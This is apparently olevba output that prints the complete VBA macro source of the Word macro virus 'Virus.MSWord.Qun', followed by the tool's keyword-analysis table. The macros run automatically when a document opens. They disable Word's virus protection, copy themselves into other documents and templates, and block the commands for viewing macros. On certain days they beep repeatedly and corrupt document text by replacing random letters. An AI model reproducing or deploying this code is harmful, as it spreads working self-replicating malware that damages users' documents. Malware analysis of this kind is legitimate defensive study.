olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Qun-e295434e10816195bf10ab3a3ebdb73dd72f57aa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Qun-e295434e10816195bf10ab3a3ebdb73dd72f57aa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'<ThE YoUnG HaCkErZ>
On Error Resume Next
Mother = Options.DefaultFilePath(2) & "\~tmp.dot"
ChGCaP
    WordBasic.DisableAutoMacros True
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    For i = 1 To Documents.Count
    If Documents(i).NAME = ActiveDocument.NAME Then
    Set ThisDoc = Documents(i)
    Second ThisDoc
    End If
    Next
ShowMessage
    WordBasic.DisableAutoMacros False
ReSCaP
'wHeRe EvEr tHe FeAr mAy bE...LoOk iT iN tHe eYe...ThE PoWeR oF ViReX 2000
End Sub
Sub FileOpen()
'<ThE YoUnG HaCkErZ>
If Dialogs(80).Show <> 0 Then
  AutoOpen
End If
'tHis sPeaCiL ViReX iS DeSiGn tO U
'bY ThE YoUnG HaCkErZ OrG.
End Sub
Sub FlyMe(ThisAD)
On Error Resume Next
Mother = Options.DefaultFilePath(2) & "\~tmp.dot"
OriNormal = NormalTemplate.FullName
Set ThisDoc = ThisAD.VBProject.VBComponents.Item(2).CodeModule
With ThisDoc
  If .Lines(2, 1) <> "'<ThE YoUnG HaCkErZ>" Then
     ChGCaP
     With ThisAD
        .UpdateStylesOnOpen = False
        .AttachedTemplate = Mother
     End With
      Application.OrganizerCopy Source:=Mother, _
      Destination:=ThisAD, NAME:="Modulee", Object:=wdOrganizerObjectProjectItems
      'Application.DisplayRecentFiles = True
      Application.StatusBar = "Copying tHe YoUnG MeLLiNiUm HaCkErZ From " + ActiveDocument.NAME + _
      " to mY New cHiLd..."
    '  MsgBox ("Hi, World")
      With ThisAD
        .UpdateStylesOnOpen = False
        .AttachedTemplate = OriNormal
     End With
     ReSCaP
  End If
  ThisAD.Save
End With
'Application.OnTime Now + TimeValue("00:00:02"), "Module1.Hi"
 End Sub
Sub Second(ThisDoc)
On Error Resume Next
Dim ADMac As Object
Set AD = ThisDoc.VBProject.VBComponents.Item(1)
With ThisDoc.VBProject.VBComponents.Item(1).CodeModule
If .Lines(1, 1) <> "" Then
 ' MsgBox ("ClenAD, World")
  .DeleteLines 1, .CountOfLines
End If
End With
For Each ADMac In ThisDoc.VBProject.VBComponents
    If ADMac.NAME <> "ThisDocument" And _
    ADMac.NAME <> "Modulee" Then
         Application.OrganizerDelete ThisDoc.FullName, ADMac.NAME, 3
    End If
Next ADMac
FlyMe ThisDoc
End Sub
'*******************
Sub ToolsMacro()
    H = MsgBox("You can't create or modify macros.", vbExclamation + vbOKOnly)
End Sub
Sub ViewVBCode()
    ToolsMacro
End Sub
Sub FileTemplates()
    ToolsMacro
End Sub
Sub HelpAbout()
    H = MsgBox("Qun katawon walataqun kalaler." & Chr(13) & Chr(13) & _
    "I LOVE SOMETHING ERROR !", vbOKOnly + vbExclamation, "tHe YoUnG MeLLiNiUm HaCkErZ")
    OpenMyMacro
End Sub
Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Options.SaveNormalPrompt = False
    Options.SavePropertiesPrompt = False
    Options.VirusProtection = False
End Sub
Sub ChGCaP()
    On Error Resume Next
    Application.Caption = "tHe YoUnG MeLLiNiUm HaCkErZ is now activating "
    ActiveWindow.Caption = "(i DoN't mEaN tO diStuRb, bUt i LuV iT)"
End Sub
Sub ReSCaP()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.NAME
End Sub
Sub OpenMyMacro()
    If InputBox("Enter password", "tHe YoUnG MeLLiNiUm HaCkErZ") = "vj" Then Application.ShowVisualBasicEditor = True
End Sub
Sub ShowMessage()
Dim NAME As String
Dim NewName As String
Dim MyName(7) As String
Dim FindTheName(10) As String
Dim Error As ErrObject
NAME = "a1Ab2Bc3Cd4De5Ef6Fg7Gh8Hi9Ij0Jk~Kl!LmMnNo$OpPq^Qr&RsStTuUv_VwWxXyYzZ"
 H = Time
 If (WeekDay(Date) = vbFriday Or WeekDay(Date) = vbSunday) And Time < TimeValue("21:00:00") Then
    For g = 1 To 9000
        Beep
    Next g
    H = MsgBox("Terimakasih buat dosenku yang amat sangat " & Chr(34) & _
    "bijaksana" & Chr(34) & "," & Chr(13) & "yang telah memberiku nilai JELEK. Saya merasa bangga " & Chr(13) & _
    "dan sungguh-sungguh bangga terhadap dosenku itu." & Chr(13) & _
    "Sekali lagi saya ucapkan terimakasih!." & Chr(13) & Chr(13) & "Semoga mereka tetap di STIKI." & _
    Chr(13) & "(buat teman-teman, ma'af mengganggu.)", vbOKOnly + vbExclamation, "Ucapan Terimakasih")
 '*******************
'***********************
For x = 1 To 29
'***********************
Dim NewHos As Object
On Error Resume Next
Again:
'ReplaceWith
NewName = ""
For i = 1 To 1
GenNewNo = Int(69 * Rnd + 1)
MyName(i) = Mid(NAME, GenNewNo, 1)
NewName = MyName(i)
Next i
ChGThiS = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz"
'FindAnDReplaceiT
FindName = ""
For y = 1 To 1
FindOldName = Int(52 * Rnd + 1)
FindTheName(b) = Mid(ChGThiS, FindOldName, 1)
Next y
    Selection.Find.ClearFormatting
    With Selection.Find
        .Text = FindTheName(b)
        .Replacement.Text = NewName
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
Next x
 End If
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

